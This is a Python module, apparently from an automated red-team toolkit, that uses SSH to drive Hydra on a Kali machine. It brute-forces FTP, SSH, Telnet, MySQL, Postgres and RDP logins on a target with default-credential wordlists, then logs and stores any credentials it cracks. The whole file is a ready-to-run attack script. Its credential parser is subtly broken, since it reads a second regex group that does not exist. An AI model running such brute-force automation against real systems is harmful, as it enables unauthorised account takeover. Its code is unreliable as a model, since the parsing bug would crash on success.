import time
import re
import config
from d4y_utils.logger import log
from core.ssh_manager import KaliSSH
from core.database import RedTeamDB

WORDLIST  = "/tmp/lab_passwords.txt"
WORDLIST_USERS = "/tmp/lab_users.txt"

LAB_PASSWORDS = [
    "msfadmin", "password", "admin", "root", "123456",
    "toor", "kali", "metasploit", "ubuntu", "user",
    "test", "1234", "pass", "administrator", "guest",
    "service", "postgres", "mysql", "ftp", "anonymous",
    "hacker", "Password123", "abc123", "letmein", "qwerty"
]

SERVICIOS_HYDRA = {
    21:   "ftp",
    22:   "ssh",
    23:   "telnet",
    3306: "mysql",
    5432: "postgres",
    3389: "rdp",
}

USUARIOS_COMUNES = [
    "root", "admin", "user", "msfadmin", "ubuntu",
    "pi", "test", "administrator", "guest", "service",
    "postgres", "mysql", "ftp", "anonymous"
]

# Servicios lentos que no aguantan muchos threads
SERVICIOS_LENTOS = [23, 5900]

def ejecutar_fuerza_bruta(perfil):
    log.info(f"🔑 Iniciando fuerza bruta con Hydra contra {perfil.ip}...")
    
    ssh = KaliSSH()
    db = RedTeamDB()

    try:
        ssh.connect()
    except Exception as e:
        log.error(f"Falla de conexión SSH a Kali en módulo bruteforce: {e}")
        return f"Error conectando a Kali: {e}"

    # Subir wordlists a Kali
    passwords_str = "\n".join(LAB_PASSWORDS)
    usuarios_str  = "\n".join(USUARIOS_COMUNES)
    ssh.upload_text(passwords_str, WORDLIST)
    ssh.upload_text(usuarios_str, WORDLIST_USERS)
    time.sleep(1)

    # Filtrar servicios por puertos abiertos
    servicios_objetivo = {
        puerto: servicio
        for puerto, servicio in SERVICIOS_HYDRA.items()
        if puerto in perfil.ports
    }

    if not servicios_objetivo:
        log.warning("⚠️ Sin servicios vulnerables a fuerza bruta en puertos detectados.")
        return "Sin servicios para fuerza bruta"

    log.info(f"Servicios objetivo identificados: {list(servicios_objetivo.values())}")

    resultados = ""
    credenciales_encontradas = []

    for puerto, servicio in servicios_objetivo.items():
        log.info(f"🔐 Ejecutando Hydra contra {servicio.upper()} en puerto {puerto}...")
        
        threads = "4" if puerto in SERVICIOS_LENTOS else str(config.HYDRA_THREADS)
        path_reporte_hydra = f"/tmp/hydra_{servicio}.txt"

        comando = (
            f"hydra -L {WORDLIST_USERS} -P {WORDLIST} "
            f"-t {threads} -f -q -w 5 -W 3 "
            f"{servicio}://{perfil.ip} "
            f"> {path_reporte_hydra} 2>&1"
        )

        ssh.ejecutar_y_leer(comando)

        resultado, _ = ssh.ejecutar_y_leer(f"cat {path_reporte_hydra}")
        resultados += f"\n--- Hydra {servicio.upper()} ---\n{resultado}"

        if f"[{puerto}]" in resultado or "login:" in resultado:
            log.info(f"🎉 ¡Credenciales encontradas en {servicio.upper()}!")
            for linea in resultado.split('\n'):
                if "login:" in linea or f"[{puerto}]" in linea:
                    credenciales_encontradas.append(f"{servicio.upper()}: {linea.strip()}")
                    log.info(f"   → {linea.strip()}")
                    
                    # Extraer user/pass y guardar en DB
                    creds = _extraer_credenciales_hydra(linea)
                    if creds:
                        user, password = creds
                        db.registrar_credencial(perfil.ip, servicio, user, password)
        else:
            log.info(f"❌ No se hallaron credenciales para {servicio.upper()}.")

    if credenciales_encontradas:
        log.info(f"🎯 Resumen de Credenciales Encontradas: {credenciales_encontradas}")

    return resultados

def _extraer_credenciales_hydra(linea):
    # Mapear e.g.: [22][ssh] host: 192.168.56.103   login: root   password: root
    user_match = re.search(r"login:\s*(\S+)", linea)
    pass_match = re.search(r"password:\s*(\S+)", linea)
    if user_match and pass_match:
        return user_match.group(1), pass_match.group(2)
    return None
